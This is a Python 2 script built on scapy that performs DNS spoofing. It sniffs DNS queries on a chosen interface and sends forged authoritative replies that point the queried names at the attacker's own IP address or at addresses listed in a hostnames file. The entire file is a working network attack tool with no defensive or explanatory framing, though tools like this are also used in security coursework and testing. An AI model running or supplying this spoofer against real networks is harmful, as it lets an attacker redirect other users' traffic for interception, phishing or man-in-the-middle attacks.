#! /usr/bin/python
import os 
from scapy.all import *
import sys
import netifaces as ni
from netifaces import AF_INET, AF_INET6
import getopt

hostnamesDict = dict()
local_ip = None
hostnames = None

def get_ip_address(ifname = None):
        if ifname!=None:
            return ni.ifaddresses(ifname)[AF_INET][0]['addr']

        intflist = ni.interfaces()      
        for intf in intflist:
            try:
                iaddr = ni.ifaddresses(intf)[AF_INET][0]['addr']
                if "127.0.0.1" not in iaddr:
                    return iaddr
            except: pass
        return ''
 
def querysniff(pkt):
        global hostnamesDict
        global local_ip
        if IP in pkt:
       
            if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
                dname = pkt[DNSQR].qname
                answer_ip = local_ip
                if hostnames!=None:
                    try:
                        answer_ip = hostnamesDict[dname.rstrip('.')]
                    except:
                        return
                spoofResp = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                              UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                              DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, ra=1, qr=1, aa=1, ancount=1, qdcount=1, \
                              an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=10, rdata=answer_ip))
                send(spoofResp)
                print "Sent Spoofed Packet: ", spoofResp.summary(),"For Request:",pkt[DNS].qd.qname,"From:",pkt[IP].src,"TXID:",hex(int(pkt[DNS].id))


def main():
    global hostnamesDict
    global local_ip
    global hostnames
    try:
        opts, args = getopt.getopt(sys.argv[1:], "i:h:")
    except getopt.GetoptError as err:
        # print help information and exit:
        print str(err)  # will print something like "option -a not recognized"
        sys.exit(2)

    interface = None
    expression = args

    for o, a in opts:
        if o == "-i":
            interface = a
        elif o == "-h":
            hostnames = a
        else:
            assert False, "unhandled option"

    local_ip = get_ip_address(interface) 
    print "Interface:",interface,"Hostnames:",hostnames,"Expression:",expression,"Local IP:",local_ip

    if hostnames!=None:
        f = open(hostnames)
        for line in f:
            ip_h = line.split(' ')
            h = ip_h[1].rstrip('\n')
            if "www" not in ip_h[1]:
                hostnamesDict["www."+h] = ip_h[0]
            else:
                hostnamesDict[h.lstrip("www.")] = ip_h[0]
            hostnamesDict[h] = ip_h[0]

    print "Hostnames:",hostnamesDict
    bpf_filter = "port 53"
    if expression!=None and len(expression)!=0:
        bpf_filter = expression[0]+" and port 53"
    
    if interface!=None:
        sniff(iface = interface,filter = bpf_filter, prn = querysniff, store = 0)
    else:
        sniff(filter = bpf_filter, prn = querysniff, store = 0)

if __name__ == "__main__":
    main()
